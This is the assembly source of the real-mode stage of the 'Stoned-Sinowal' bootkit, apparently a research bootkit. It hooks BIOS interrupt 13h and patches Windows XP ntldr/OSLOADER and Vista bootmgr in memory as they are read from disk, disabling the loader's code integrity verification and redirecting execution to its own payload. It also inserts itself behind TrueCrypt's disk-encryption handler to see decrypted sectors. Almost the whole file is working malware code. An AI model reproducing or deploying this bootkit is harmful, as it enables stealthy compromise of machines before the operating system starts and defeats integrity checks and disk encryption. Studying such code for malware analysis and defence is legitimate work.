
;  Stoned-Sinowal Bootkit [Real Mode]

;  reverse engineering and development done by Peter Kleissner


; pre-load the boot loader (chainloading), the MBR spoof plugin will be installed automatically
mov ax,API_Load_Original_Bootloader
call ax

; date expiry
;mov ah,04h                            ; INT 1A - TIME - GET REAL-TIME CLOCK DATE
;int 1Ah
;jc Execute_Original_Bootloader
;cmp cl,10h                            ; CL = year (BCD)     2010
;jne Execute_Original_Bootloader
;cmp dh,01h                            ; DH = month (BCD)    01 (January)
;ja Execute_Original_Bootloader

; allocate 4096 bytes for the interrupt 13h background service
push es
mov si,0413h                                                                    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
sub [si],word 4                                                                 ; 4096 bytes
lodsw
shl ax,6                                                                        ; * 1024 / 16
mov es,ax                                                                       ; store segment address
xor di,di                                                                       ; offset

; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
mov si,Pwn_Windows
mov ecx,Total_End_of_Binary
rep movsb

; backup old int 13h vector
mov eax,[13h * 4]                                                               ; backup IVT vector 13h
mov [es:Forward_Interrupt_13h_Original + 1],eax                                 ; store the old jump address

; hook int 13h
mov [13h * 4],word Interrupt_13h_Hook                                           ; new address to jump to on "int 13h" instruction
mov [13h * 4 + 2],es                                                            ; set segment to jump to on int 13h

pop es

; execute the original bootloader
Execute_Original_Bootloader:
jmp 0000h:API_Execute_7C00h_Bootloader_Image                                    ; (far jump because relative offset is not available)


; now our background "service" starts, we get control only by int 13
; the code is now located at the end of memory (most likely 9F400h)


;direct declare string for print will crash because this code wille be relocate.
Interrupt_13h_Hook:   
 ; encrypted sectors will be read/written here
 ; %ifdef _DEBUG
 ; push ebx
 ; push cx
 ; call stub_xx
 ; Debug_Message_Interrupt_13h_Hook                    db "Interrupt_13h_Hook called ", 0
 ; stub_xx:
 ; mov eax,cs
 ; shl eax,4
 ; pop cx
 ; movzx ebx, cx
 ; add eax,  ebx
 ; pop cx
 ; pop ebx
 ; call API_Debug_Message
 ; %endif


; TrueCrypt called us? (this jumps then back to TrueCrypt if it is active)
call TrueCrypt_Complex_BIOS_Forward

; install the double forward to TrueCrypt (only if TrueCrypt becomes active)
call Install_TrueCrypt_Hook

Interrupt_13h_Hook_Stage_2:                                                     ; decrypted sectors will be read/written here

; only hook "Extended Read" and "Read" functions of interrupt 13h
cmp ah,42h                                                                      ; Extended Read?
jz Handle_Int13h
cmp ah,02h                                                                      ; Read?
jnz Forward_Interrupt_13h_Original

Handle_Int13h:

; (store register contents that will be modified by int 13h but contains important input values)
push ax                                                                         ; store registers, parameters for "Read"
push cx

; forward the command and return here
pushfw                                                                          ; simulate interrupt instruction (flags)
push cs                                                                         ; simulate interrupt instruction (code segment)
call word Forward_Interrupt_13h_Original

; (restore them)
pop cx
pop ax
%if 0 = 1
jnc No_Error_Handling

pushfw
pushad

mov di,MyError + 17
call HexToStr_dword

;mov si,MyError
;call Print_Text

;xor ax,ax
;int 16h

mov si,MyError
mov ecx,25
push es
mov ax,0B800h
mov es,ax
xor di,di
xor ax,ax
MyLoop:
cs lodsb
stosb
inc di
loop MyLoop

pop es

popad
popfw
jmp No_Error_Handling

MyError db "Error with EAX = 000F1234", 13, 10, 0

%include "Debug API.asm"

No_Error_Handling:
%endif
jc Exit_Interrupt_13h_Hook_FarReturn                                            ; if error (couldn't read), return immediately


; store all registers to restore them when leaving this handler
pushfw
pushad
push ds                                                                         ; data segment register will be modified to access this modules data
push es

; now "normalize" parameters of "Read" and "Extended Read" (get them to one format for further handling)
mov di,bx                                                                       ; di will store target buffer
cmp ah,02h                                                                      ; Read command?
jz Parameters_Normalized
mov cx,[si+0x2]                                                                 ; get sector count from disk address packet [Extended Read]
les di,[si+0x4]                                                                 ; get buffer from disk address packet       [Extended Read]
Parameters_Normalized:
shl cx,9                                                                        ; number of bytes = sector count * 512
cld
;xor bx,bx                                                                       ; bx = pointer to base of this module
push cs
pop ds                                                                          ; access data of this module


; scan for signatures
test [Configuration_Bits],byte 00001000b                                        ; ntldr already hooked? (check bit 3)
jnz End_Signatures_Ntldr
pushaw                                                                          ; store registers (contain int 13h input values)


; scan the read buffer for a part of the ntldr [same as in previous Sinowal version]
;   + 83 C4 02 E9 00 00 E9 FD FF
;     Windows XP.NTLDR +1C81h
;     Windows XP.NTLDR +1C9Ch
; patch applied:  bypass NT Loader code integrity verification (a call will be nopped and a jump address modified)
; XP, Server 2003 (2x times):
;   00021c6e: call .+0x0c1e/+0x0c39     ; e8390c            ->    nop, nop, nop
;   00021c71: add sp, 0x0002            ; 83c402            ->    add sp, 0x0002
;   00021c74: jmp .+0x0000              ; e90000            ->    jmp .+0x0000
;   00021c77: jmp .+0xfffd              ; e9fdff            ->    jmp .+0x0000
;   (code differs here between first and secound found and will not be touched)
Search_Signature_1:
mov al,83h
repne scasb                                                                     ; scan the buffer for 83h
jnz End_Signature_1                                                             ; if not any further found scan for next signature
cmp dword [es:di],00E902C4h
jnz Search_Signature_1
cmp dword [es:di+0x4],0FFFDE900h
jnz Search_Signature_1
mov dword [es:di-0x4],83909090h                                                 ; set 3 bytes to instruction nop
mov word [es:di+0x6],0                                                          ; modify jump operation, set highest byte to zero [now mov operation! was and instruction]
or byte [Configuration_Bits],00000001b                                          ; found signature 1
jmp short Search_Signature_1

End_Signature_1:
popaw                                                                           ; restore register contents
pushaw


; now scan the read buffer for a signature in OSLOADER [same as in previous Sinowal version]
;   + 8B F0 85 F6 74 21/22 80 3D
;     Windows XP.OSLOADER +26B9Fh
; if found, remove int 13h hook and thats it
;   0004b502: mov esi, eax                    ; 8bf0
;   0004b504: test esi, esi                   ; 85f6
;   0004b506: jz .+0x00000021                 ; 7421
;   0004b508: cmp byte ptr ds:0x442284, 0x00  ; 803d8422440000
Search_Signature_2:
mov al,8Bh
repne scasb
jnz End_Signature_2                                                             ; if not any further found finish
cmp dword [es:di],74F685F0h
jnz Search_Signature_2
cmp word [es:di+0x5],3D80h
jnz Search_Signature_2
mov ax,[es:di+0x3]
cmp ah,21h                                                                      ; 21h or 22h are accepted for signature
jz Found_Signature_2
cmp ah,22h
jnz Search_Signature_2                                                          ; otherwise continue search

Found_Signature_2:
call word Hook_Windows_XP_OSLOADER                                              ; hook OSLOADER
popaw
jmp short Remove_Interrupt_13h_Hook                                             ; remove the hook and exit

End_Signature_2:
popaw


End_Signatures_Ntldr:
test byte [Configuration_Bits],00000001b                                        ; verify signature 1 found
jnz Exit_Interrupt_13h_Hook                                                     ; if not => do not operate any further, exit


; now scan the read buffer for a signature in bootmgr
;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
;     Windows Vista bootmgr at address 06F2h
; patch applied: hooking code to call protected mode part
;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
;   000205ef:  cbw                              ; 98        ->    
;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
Search_Signature_3:
mov al,8Ah
repne scasb
jnz Exit_Interrupt_13h_Hook                                                     ; if not found => exit
cmp byte [es:di],0x46
jnz Search_Signature_3
cmp dword [es:di+2],00003D98h
jnz Search_Signature_3
cmp dword [es:di+6],03E90375h
jnz Search_Signature_3
cmp dword [es:di+10],0035E900h
jnz Search_Signature_3

; apply patch:
;   + 66 9A ADDRESS 20 90
Found_Signature_3:                                                              ; found signature 3!
dec di
mov word [es:di],0x9A66                                                         ; patch something
xor eax,eax
mov ax,cs                                                                       ; get code segment
shl eax,4                                                                       ; linear address (* 16)
add eax,Entry_Point_OS_Vista                                                    ; add offset to Vista entry point
mov [es:di+0x2],eax                                                             ; store address to jump to
mov word [es:di+0x6],0x20                                                       ; ?
mov byte [es:di+0x8],0x90                                                       ; nop
or byte [Configuration_Bits],00001000b                                          ; for any further int 13h call: do not scan for signatures
jmp short Exit_Interrupt_13h_Hook                                               ; everything done fine


Remove_Interrupt_13h_Hook:
mov eax,[Forward_Interrupt_13h_Original+1]                                      ; offset of original int 13h
mov ds,bx                                                                       ; set data segment to 0000h
mov [13h * 4],eax                                                               ; restore interrupt 13h vector (reset offset)


Exit_Interrupt_13h_Hook:
pop es                                                                          ; restore all register contents as it was before this hook
pop ds
popad
popfw
mov ah,0                                                                        ; error code = 00h  successful completion

Exit_Interrupt_13h_Hook_FarReturn:
retf 2                                                                          ; simulate "iretw" instruction, but to preserve flags (especially flags.CF)


; hook the ntldr
;   + FF 15 FC F5 09 00
;     00046b9f:   mov esi, eax                      ->    call [0009F5FCh]
;     00046ba1    test esi, esi                     ->    
;     00046ba3    jz .+0x00000021                   ->    
;     00046ba5:   cmp byte ptr ds:0x43aef8, 0x00    ->    cmp byte ptr ds:0x43aef8, 0x00
;     00046bac:   jz .+0x00000007                   ->    jz .+0x00000007
Hook_Windows_XP_OSLOADER:                                                       ; hook the ntldr
dec di                                                                          ; -1 to get offset of signature
mov eax,[es:di]                                                                 ; backup
mov [Relocate_Me_Code + 0],eax
mov ax,[es:di+4]                                                              ; 6 bytes of code
mov [Relocate_Me_Code + 4],ax
mov ax,15FFh                                                                    ; the opcode which jumps to the pointer (call instruction)
stosw
mov eax,cs
shl eax,4                                                                       ; eax = linear address of this segment
add [Calling_Address],eax                                                       ; offset + base address
add eax,Calling_Address                                                         ; will be address to jump to
stosd                                                                           ; store address
ret


; this here is Configuration Data
;   bit 0:  found Signature 1
;   bit 3:  disable ntldr signature check  (when signature have been already found)
Configuration_Bits    db  00000000b

; linear address of Windows XP entry point
Calling_Address       dd  Entry_Point_Windows_XP


Forward_Interrupt_13h_Original:

; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
jmp word 0000h:0000h



Install_TrueCrypt_Hook:

; check if TrueCrypt is installed and modify hook =)
push ds
push eax
xor ax,ax
mov ds,ax
cmp [13h * 4],word Interrupt_13h_Hook
je NoTrueCrypt_Detected

; Windows request -> modified by Stoned Bootkit -> TrueCrypt Encryption -> (double forward here) -> Interrupt 13h
mov eax,dword [13h * 4]                                                         ; IVT interrupt 13h vector contains TrueCrypt
xchg dword [cs:Forward_Interrupt_13h_Original + 1],dword eax                    ; so set as forward; eax contains then the original BIOS interrupt 13h handler

; set forwarded for reading/writing encrypted sectors
mov [cs:TrueCrypt_Complex_BIOS_Forward + 0],dword 0EA02C483h                    ; opcodes
mov [cs:TrueCrypt_Complex_BIOS_Forward + 4],dword eax                           ; and address

; hook interrupt 13h - again :-)
mov [13h * 4],word Interrupt_13h_Hook_Stage_2                                   ; new address to jump to on "int 13h" instruction :-)
mov [13h * 4 + 2],cs                                                            ; set segment to jump to on int 13h

; handle the call without quering the call to TrueCrypt again :)
pop eax
pop ds
jmp TrueCrypt_Complex_BIOS_Forward

NoTrueCrypt_Detected:
pop eax
pop ds

ret


TrueCrypt_Complex_BIOS_Forward:

nop   ; 83C402              add sp,2                removing the function call
nop   
nop   
nop   ; EA00000000          jmp word 0000h:0000h    jumping to the BIOS
nop   
nop   
nop   
nop   

ret

